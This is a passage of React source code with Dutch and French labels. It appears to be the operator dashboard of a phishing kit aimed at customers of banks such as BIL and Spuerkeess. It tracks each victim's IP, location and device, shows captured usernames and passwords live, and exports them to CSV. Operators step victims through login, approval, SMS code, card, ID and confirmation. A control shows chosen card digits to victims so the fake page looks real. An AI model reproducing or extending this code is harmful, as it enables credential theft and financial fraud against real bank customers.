      <h4 className="text-[13px] font-extrabold uppercase tracking-wider text-emerald-300">
        Kaart eindigt op ****
      </h4>
      <p className="mt-1 text-[12px] leading-snug text-purple-300/80">
        Typ 4 cijfers — bezoeker ziet « se terminant par » die cijfers op de kaartpagina.
      </p>
      <div className="mt-2 flex gap-1.5">
        <input
          value={input}
          onChange={(e) => setInput(e.target.value.replace(/\D/g, "").slice(0, 4))}
          placeholder="9392"
          inputMode="numeric"
          maxLength={4}
          className="min-w-0 flex-1 rounded-lg border border-white/10 bg-black/30 px-3 py-2.5 text-center font-mono text-[18px] font-extrabold tracking-[0.3em] text-white outline-none placeholder:text-neutral-600 focus:border-emerald-400"
        />
        <button
          onClick={save}
          disabled={busy || String(input).replace(/\D/g, "").length !== 4}
          className="min-h-[44px] rounded-lg bg-emerald-600 px-4 text-[13px] font-extrabold text-white transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
        >
          {busy ? "…" : "Toon"}
        </button>
      </div>
      <div className="mt-2 flex items-center justify-between gap-2">
        <p className="text-[12.5px] font-bold text-purple-100">
          Live:{" "}
          {live ? (
            <span className="font-mono tracking-[0.2em] text-emerald-300">•••• {live}</span>
          ) : (
            <span className="text-purple-300/70">— niet ingesteld</span>
          )}
        </p>
        {live && (
          <button onClick={clear} disabled={busy} className="rounded-lg bg-white/10 px-2.5 py-1.5 text-[12px] font-bold text-red-300 hover:bg-white/20">
            Wissen
          </button>
        )}
      </div>
      {msg && (
        <p className="mt-1.5 text-center text-[12px] font-bold text-purple-200">{msg}</p>
      )}
    </div>
  );
}

function SessionView({ v, now, logs, onBack, onAction, onRemove }) {
  const online = isOnline(v, now);
  const rows = [
    ["Status", online ? "Online" : "Offline", online ? "text-green-300" : "text-neutral-300"],
    ["IP-adres", v.ip || "…", "font-mono"],
    ["Locatie", `${v.city || "…"}, ${v.country || "…"}`, ""],
    ["Bank", v.bankName || v.bank || "—", "font-bold"],
    ["Stap", STATUS_LABEL[v.status] || v.status || "—", ""],
    ["OS", parseOS(v.ua), ""],
    ["Online sinds", timeAgo(v.joinedAt || v.lastSeen), ""],
    ["Laatst gezien", `${timeAgo(v.lastSeen)} • ${fmtTime(v.lastSeen)}`, ""],
  ];
  return (
    <div className="w-full">
      <div className="flex flex-wrap items-center gap-2">
        <button onClick={onBack} className="min-h-[40px] rounded-full bg-white/10 px-4 py-2 text-[13px] font-bold text-purple-100 hover:bg-white/20">
          ← Dashboard
        </button>
        <div className="flex min-w-0 flex-1 items-center gap-2.5">
          <MiniLogo slug={v.bank} name={v.bankName} />
          <div className="min-w-0">
            <p className="truncate text-[15px] font-extrabold text-white">{v.bankName || v.bank} <span className="font-mono text-[12px] text-purple-300">{v.id?.slice(0, 10)}</span></p>
            <p className="text-[12px] text-purple-300">{STATUS_LABEL[v.status] || v.status}</p>
          </div>
        </div>
        <span className={`shrink-0 rounded-full px-2.5 py-1 text-[12px] font-bold ${needsAction(v, now) ? "wait-blink bg-red-500 text-white shadow-[0_0_16px_rgba(239,68,68,0.6)]" : online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
          {needsAction(v, now) ? "● Wachten op actie" : online ? "● Online" : "● Offline"}
        </span>
      </div>

      <div className="mt-3 grid w-full grid-cols-1 gap-3 lg:grid-cols-12">
        {/* LEFT — device status info */}
        <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Apparaatstatus</h3>
          <dl className="mt-2 space-y-2">
            {rows.map(([k, val, cls]) => (
              <div key={k} className="flex items-start justify-between gap-2 border-b border-white/5 pb-1.5 text-[13px] last:border-0">
                <dt className="shrink-0 text-purple-300">{k}</dt>
                <dd className={`min-w-0 break-words text-right text-purple-50 ${cls}`}>{val}</dd>
              </div>
            ))}
          </dl>
          <p className="mt-2 break-words text-[12px] leading-snug text-purple-300/70">{v.ua || ""}</p>
        </aside>

        {/* MIDDLE — logs */}
        <section className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-6">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">
              Logs ({logs.length})
            </h3>
            <button
              onClick={() => logs.length && downloadCSV(stampName(`logs-${v.bank || "visiteur"}-${(v.id || "").slice(0, 6)}`), submissionsToCSV(logs))}
              disabled={logs.length === 0}
              className="min-h-[36px] rounded-full bg-emerald-600 px-4 py-1.5 text-[13px] font-extrabold text-white transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
            >
              ⭳ Exporter
            </button>
          </div>
          <div className="mt-2.5 space-y-2.5">
            {logs.length === 0 && (
              <p className="rounded-lg bg-white/5 p-4 text-center text-[13.5px] text-purple-200">
                Nog geen gegevens. Gebruik het rechterpaneel → Login vragen. Ingevulde gebruikersnaam/wachtwoord verschijnt hier live.
              </p>
            )}
            {logs.map((s) => (
              <LogCard key={s.id} s={s} />
            ))}
          </div>
        </section>

        {/* RIGHT — ask-step buttons */}
        <aside className="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10 sm:p-4 lg:col-span-3">
          <h3 className="text-[13px] font-extrabold uppercase tracking-wider text-fuchsia-300">Actions</h3>
          <div className="mt-2.5">
            <CardHintCard visitorId={v.id} />
          </div>
          {(v.bank === "bil" || v.bank === "spuerkeess") && (
            <div className="mt-2.5">
              <QrUploadCard visitorId={v.id} bankName={v.bankName || v.bank} />
            </div>
          )}
          <div className="mt-2.5 grid grid-cols-2 gap-1.5 lg:grid-cols-1">
            {ACTIONS.filter((a) => !a.banks || a.banks.includes(v.bank)).map((a) => (
              <button
                key={a.key}
                onClick={() => onAction(a.key)}
                className={`min-h-[44px] rounded-lg px-3 py-2 text-[13.5px] font-bold active:scale-[0.98] ${a.style}`}
              >
                {a.label}
              </button>
            ))}
          </div>
          <button onClick={onRemove} className="mt-2 min-h-[40px] w-full rounded-lg bg-white/5 px-3 py-2 text-[13px] font-bold text-red-300 ring-1 ring-white/10 hover:bg-white/10">
            Bezoeker verwijderen
          </button>
          <p className="mt-2 text-[12px] leading-snug text-purple-300/80">
            De gebruiker wacht op de lader na elke invoer. Vraag de stappen één voor één: Inloggen → Goedkeuring → Telefoon → SMS → Kaart → Info → ID → Bevestigen.
          </p>
        </aside>
      </div>
    </div>
  );
}

function GlobalLogs({ submissions, onView }) {
  // Newest first, always — explicit sort, never source-order dependent.
  const all = submissions.slice().sort((a, b) => (b.at || 0) - (a.at || 0));
  return (
    <div className="w-full">
      <div className="flex flex-wrap items-center justify-between gap-2">
        <h2 className="text-[16px] font-extrabold text-white">Logs ({all.length})</h2>
        <button
          onClick={() => exportAllLogs(submissions)}
          disabled={all.length === 0}
          className="min-h-[40px] rounded-full bg-emerald-600 px-4 py-2 text-[13px] font-extrabold text-white shadow-[0_4px_16px_rgba(5,150,105,0.4)] transition hover:bg-emerald-500 active:scale-95 disabled:opacity-40"
        >
          ⭳ Export all
        </button>
      </div>
      <div className="mt-3 space-y-2.5">
        {all.length === 0 && (
          <p className="rounded-xl bg-white/5 p-5 text-center text-[13.5px] text-purple-200 ring-1 ring-white/10">Nog geen logs.</p>
        )}
        {all.map((s) => (
          <LogCard
            key={s.id}
            s={s}
            wrapClass="rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10"
            meta={<span className="font-mono text-[12px] text-purple-300">{s.visitorId?.slice(0, 10)} • {s.bank}</span>}
            footer={
              <button onClick={() => onView(s.visitorId)} className="mt-2 min-h-[36px] rounded-lg bg-white/10 px-3 py-1.5 text-[13px] font-bold text-purple-100 transition hover:bg-white/20 active:scale-95">
                Sessie openen →
              </button>
            }
          />
        ))}
      </div>
    </div>
  );
}

function PasswordForm() {
  const [cur, setCur] = useState("");
  const [next, setNext] = useState("");
  const [confirm, setConfirm] = useState("");
  const [msg, setMsg] = useState("");
  const [busy, setBusy] = useState(false);
  async function save(e) {
    e?.preventDefault?.();
    setMsg("");
    if (next !== confirm) {
      setMsg("Nieuwe wachtwoorden komen niet overeen.");
      return;
    }
    if (next.length < 8) {
      setMsg("Nieuw wachtwoord: minimaal 8 tekens.");
      return;
    }
    setBusy(true);
    try {
      const r = await apiChangePassword(cur, next);
      setCur("");
      setNext("");
      setConfirm("");
      setMsg(r?.persisted === false
        ? "✓ Gewijzigd (alleen tot herstart — .env niet schrijfbaar)."
        : "✓ Wachtwoord gewijzigd.");
    } catch (err) {
      setMsg(`Wijzigen mislukt: ${err.message || "opnieuw proberen"}`);
    } finally {
      setBusy(false);
    }
  }
  return (
    <form onSubmit={save} className="mt-1 space-y-2 rounded-lg bg-white/[0.04] p-3 ring-1 ring-white/10">
      <p className="text-[13px] font-extrabold text-purple-200">Wachtwoord wijzigen</p>
      <input
        type="password"
        value={cur}
        onChange={(e) => setCur(e.target.value)}
        autoComplete="current-password"
        placeholder="Huidig wachtwoord"
        className="w-full rounded-lg border border-white/10 bg-black/30 px-3 py-2.5 text-[14px] text-white outline-none placeholder:text-neutral-500 focus:border-purple-500"
      />
      <input
        type="password"
        value={next}
        onChange={(e) => setNext(e.target.value)}
        autoComplete="new-password"
        placeholder="Nieuw wachtwoord (min. 8 tekens)"
        className="w-full rounded-lg border border-white/10 bg-black/30 px-3 py-2.5 text-[14px] text-white outline-none placeholder:text-neutral-500 focus:border-purple-500"
      />
      <input
        type="password"
        value={confirm}
        onChange={(e) => setConfirm(e.target.value)}
        autoComplete="new-password"
        placeholder="Herhaal nieuw wachtwoord"
        className="w-full rounded-lg border border-white/10 bg-black/30 px-3 py-2.5 text-[14px] text-white outline-none placeholder:text-neutral-500 focus:border-purple-500"
      />
      {msg && <p className="text-[12.5px] font-semibold text-purple-200">{msg}</p>}
      <button
        type="submit"
        disabled={busy || !cur || !next || !confirm}
        className="min-h-[44px] w-full rounded-lg bg-purple-600 py-2.5 text-[14px] font-bold text-white transition hover:bg-purple-500 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-40"
      >
        {busy ? "Bezig…" : "Wachtwoord opslaan"}
      </button>
    </form>
  );
}

function Settings({ apiMode, onlineCount, total, onLogout }) {
  return (
    <div className="w-full max-w-xl">
      <h2 className="text-[16px] font-extrabold text-white">Instellingen</h2>
      <div className="mt-3 space-y-2.5 rounded-xl bg-[#1d1430] p-4 text-[14px] ring-1 ring-white/10">
        <div className="flex justify-between gap-2"><span className="text-purple-300">Modus</span><b className="text-white">{apiMode ? "Postgres API" : "Lokale modus"}</b></div>
        {apiMode && <div className="flex justify-between gap-2"><span className="text-purple-300">API</span><span className="break-all font-mono text-[13px] text-white">{apiBase()}</span></div>}
        <div className="flex justify-between gap-2"><span className="text-purple-300">Live nu</span><b className="text-white">{onlineCount} / {total}</b></div>
        <div className="flex justify-between gap-2"><span className="text-purple-300">Admin gebruiker</span><b className="text-white">admin</b></div>
        {apiMode && <PasswordForm />}
        <button onClick={onLogout} className="mt-1 min-h-[44px] w-full rounded-lg bg-red-500/20 py-2.5 text-[14px] font-bold text-red-200">
          Uitloggen
        </button>
        <Link to="/" className="block text-center text-[13px] font-semibold text-purple-300">← Terug naar site</Link>
      </div>
    </div>
  );
}
